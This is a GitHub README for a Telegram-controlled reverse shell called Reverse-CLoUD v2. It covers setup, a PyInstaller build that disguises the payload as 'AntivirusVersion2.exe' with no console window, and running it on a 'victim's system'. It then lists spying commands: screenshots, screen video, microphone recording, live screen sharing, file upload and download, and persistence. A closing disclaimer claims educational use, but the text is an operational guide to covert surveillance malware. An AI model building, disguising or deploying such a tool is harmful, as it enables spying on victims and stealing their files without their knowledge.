<h1 align="center">👁️ Reverse-CLoUD v2 👁️</h1>


<p align="center">
  <i>it's a Reverse Shell Connected telegram bot 👉 (It is a test and demonstration version)👈 </i>
</p>
<p align="center">
  <img src="file's/1.png" width="1080">



## 📃 Needs editing :
```text
✅ = Mandatory -- compulsory
❌ = optional -- voluntary

main.py :
 line 52 = Bot Token ✅
 line 53 = admin chat id  ✅
 line 54 = CMD_TIMEOUT ❌
```

## ⚠️ point :
```text
Create a separate bot for each target.
Reason: Lack of session management.
```


  ## You must execute the file on the victim's system using some method.⤵️
  
  ### 📩 Installation steps : 
- 1️⃣ Installing the repository :
```bash
git clone https://github.com/The-Lxx-CLoUD/Reverse-CLoUDv2
```
- 2️⃣ Open the file :
```bash
cd Reverse-CLoUDv2
```
- 3️⃣ edit the file  :
```bash
👉 📃 Needs editing 👈
```
- 4️⃣ installing requirements  (only on your system) :
```bash
pip install requests 
```
```bash
pip install mss 
```
```bash
pip install sounddevice 
```
```bash
pip install numpy 
```
```bash
pip install opencv-python 
```
```bash
pip install Pillow
```
```bash
pip install pyinstaller
```
- 5️⃣ Build :
### 1- Simple :
```bash
pyinstaller --onefile --noconsole --name "AntivirusVersion2" c2beta.py
```
### 2- best :
```bash
pyinstaller --onefile --noconsole --name "AntivirusVersion2" --add-data "c2beta.py;." --hidden-import "ctypes" --hidden-import "win32api" --hidden-import "win32com" --hidden-import "Crypto" --hidden-import "Crypto.Cipher" --hidden-import "Crypto.Util" --hidden-import "psutil" --hidden-import "requests" --hidden-import "pynput" --hidden-import "mss" --hidden-import "sounddevice" --hidden-import "cv2" --collect-all "Crypto" --collect-all "cv2" --collect-all "pynput" --collect-all "mss" --collect-all "sounddevice" c2beta.py
```
-  exe file in this folder --->  `dist/AntivirusVersion2.exe`

- 6️⃣ Run  exe file , in target pc 🔥


##

### Now You can use this commands :
```text
📚 Multi-Session Commands
Capture:
screenshot — Taking a screenshot 📸
screenvideo 10 — Video from screen 🎬 (1–60 seconds)
record 10 — Audio Recording 🎤 (1–60 seconds) 
screenshare — Send photo every 5 seconds 🖥️
screenshare_stop — Stop screen sharing 

Files:
upload C:\Users → Custom path 
download  (ex: download ali.png) → download file
cd (ex: cd C:/Users) → Custom path 
pwd → Current path 

System:
persist | exit

dev : @lxxcloud
```

##

### 👤 Author

GitHub : [👉 @The-Lxx-CLoUD 👈](https://github.com/The-Lxx-CLoUD)

Telegram : [👉 @lxxcloud 👈](https://t.me/lxxcloud)
  
```text
For educational and authorized security testing purposes only.
Use this tool only on systems you own or have explicit permission to test.
The user bears full responsibility for ensuring lawful use.
 The developer assumes no liability for any misuse or illegal activity associated with this tool.

```
